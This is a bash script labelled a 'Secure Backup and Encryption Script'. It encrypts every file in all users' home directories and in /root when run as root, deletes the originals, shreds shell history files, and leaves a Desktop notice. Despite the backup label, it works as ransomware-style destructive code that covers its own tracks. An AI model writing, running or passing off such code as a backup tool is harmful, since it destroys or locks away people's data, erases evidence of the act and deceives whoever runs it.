#!/bin/bash

########################################
# Secure Backup and Encryption Script
# (Compress entire home folder -> Encrypt tar.gz -> Encrypt original files -> Create warning)
########################################

# Color definitions
GREEN="\033[0;32m"
RED="\033[0;31m"
YELLOW="\033[1;33m"
BLUE="\033[0;34m"
RESET="\033[0m"

# Print banner
echo -e "${GREEN}========================================="
echo -e "     Secure Backup & Encryption Script    "
echo -e "=========================================${RESET}"

########################################
# Prompt for password
########################################
echo -e "${YELLOW}Enter encryption password:${RESET}"
read -s PASSWORD
echo
echo -e "${YELLOW}Re-enter encryption password:${RESET}"
read -s PASSWORD_CONFIRM
echo
if [ "${PASSWORD}" != "${PASSWORD_CONFIRM}" ]; then
    echo -e "${RED}Error: Passwords do not match.${RESET}"
    exit 1
fi

########################################
# Function: create_warning_file
# Creates a multiline text file on the user's Desktop
########################################
create_warning_file() {
    local user_home="$1"
    local desktop_path="${user_home}/Desktop"

    # Create the Desktop directory if it does not exist
    mkdir -p "${desktop_path}"

    cat << 'EOF' > "${desktop_path}/BackupWarning.txt"
IMPORTANT NOTICE:
A backup of your entire home directory was just created, compressed, and encrypted.
Additionally, all original files inside your home folder have been individually encrypted.

You may safely transfer or store these archives. 
If you have any questions, contact the system administrator.
EOF

    echo -e "${YELLOW}Created backup warning file at: ${desktop_path}/BackupWarning.txt${RESET}"
}

########################################
# Function: encrypt_tar
# Compresses and encrypts an entire directory into <dir>.tar.gz.enc
########################################
encrypt_tar() {
    local dir_name="$1"

    echo -e "${YELLOW}Compressing entire directory: ${dir_name}${RESET}"
    tar -czf "${dir_name}.tar.gz" "${dir_name}" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo -e "${RED}Error: Failed to archive ${dir_name}.${RESET}"
        return 1
    fi

    echo -e "${YELLOW}Encrypting archive: ${dir_name}.tar.gz${RESET}"
    openssl enc -aes-256-cbc -salt \
        -in "${dir_name}.tar.gz" \
        -out "${dir_name}.tar.gz.enc" \
        -pass pass:"${PASSWORD}" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo -e "${RED}Error: Encryption failed for ${dir_name}.tar.gz.${RESET}"
        rm -f "${dir_name}.tar.gz" 2>/dev/null
        rm -f "${dir_name}.tar.gz.enc" 2>/dev/null
        return 1
    fi

    echo -e "${YELLOW}Removing unencrypted archive: ${dir_name}.tar.gz${RESET}"
    shred -u -z "${dir_name}.tar.gz"

    return 0
}

########################################
# Function: encrypt_original_files
# Encrypts each file in the directory in-place (file -> file.enc), then removes the original
########################################
encrypt_original_files() {
    local dir_path="$1"

    echo -e "${YELLOW}Encrypting each original file in: ${dir_path}${RESET}"

    # Find all regular files (excluding newly created .enc files) and encrypt them in-place
    # We also skip any existing .enc files, hidden directories, etc. 
    # The 'shopt -s dotglob' can be used if you want to include hidden files. 
    # By default, 'find' includes hidden files. We just skip .enc outputs.

    find "${dir_path}" -type f ! -name "*.enc" | while read -r file; do
        # Skip any directories or the newly created BackupWarning.txt if it exists for some reason
        # (Though it shouldn't exist yet if we are creating it after encryption)
        if [[ "$file" == *"BackupWarning.txt" ]]; then
            continue
        fi

        # Perform encryption of the file
        openssl enc -aes-256-cbc -salt \
            -in "$file" \
            -out "${file}.enc" \
            -pass pass:"${PASSWORD}" 2>/dev/null

        if [ $? -ne 0 ]; then
            echo -e "${RED}Error: Encryption failed for $file.${RESET}"
            continue
        fi

        # Remove the original file
        rm -f "$file"
    done
}

########################################
# Function: remove_shell_history
# Securely removes .bash_history and .zsh_history
########################################
remove_shell_history() {
    local dir_path="$1"

    echo -e "${YELLOW}Securely removing history in: ${dir_path}${RESET}"
    shred -u -z "${dir_path}/.bash_history" "${dir_path}/.zsh_history" 2>/dev/null
}

########################################
# MAIN SCRIPT LOGIC
########################################
if [ "$(id -u)" -eq 0 ]; then
    ########################################
    # Running as root: process /home/* and also /root
    ########################################
    echo -e "${BLUE}Script executed as root. Encrypting all home directories...${RESET}"

    cd /home || {
        echo -e "${RED}Error: Failed to change directory to /home.${RESET}"
        exit 1
    }

    # Encrypt each user directory
    for user_dir in *; do
        if [ -d "${user_dir}" ]; then
            # 1) Create tar.gz.enc of the entire folder
            encrypt_tar "${user_dir}"
            # 2) Encrypt original files in that folder
            encrypt_original_files "/home/${user_dir}"
            # 3) Remove shell history
            remove_shell_history "/home/${user_dir}"
        fi
    done

    # Root's history
    echo -e "${YELLOW}Securely removing root user's history...${RESET}"
    shred -u -z /root/.bash_history /root/.zsh_history 2>/dev/null

    # Root user: compress & encrypt /root directory as well, if desired
    if [ -d "/root" ]; then
        # Move to / so we can tar /root
        cd / || {
            echo -e "${RED}Error: Failed to change directory to /.${RESET}"
            exit 1
        }
        encrypt_tar "root"
        encrypt_original_files "/root"
    fi

    # Finally, create a warning file on each user's Desktop
    cd /home || exit 1
    for user_dir in *; do
        if [ -d "${user_dir}" ]; then
            create_warning_file "/home/${user_dir}"
        fi
    done
    # And root's Desktop
    if [ -d "/root" ]; then
        create_warning_file "/root"
    fi

else
    ########################################
    # Running as non-root: process only the current user's home directory
    ########################################
    current_user="$(whoami)"
    home_dir="/home/${current_user}"

    echo -e "${BLUE}Script executed as user: ${current_user}${RESET}"

    if [ ! -d "${home_dir}" ]; then
        echo -e "${RED}Error: Home directory for user ${current_user} not found.${RESET}"
        exit 1
    fi

    # 1) Create tar.gz.enc of the entire folder
    cd /home || {
        echo -e "${RED}Error: Failed to change directory to /home.${RESET}"
        exit 1
    }
    encrypt_tar "${current_user}"

    # 2) Encrypt original files
    encrypt_original_files "${home_dir}"

    # 3) Remove shell histories
    remove_shell_history "${home_dir}"

    # 4) Create the warning file
    create_warning_file "${home_dir}"
fi

echo -e "${GREEN}Process complete. Encrypted archives are ready for transfer.${RESET}"
exit 0
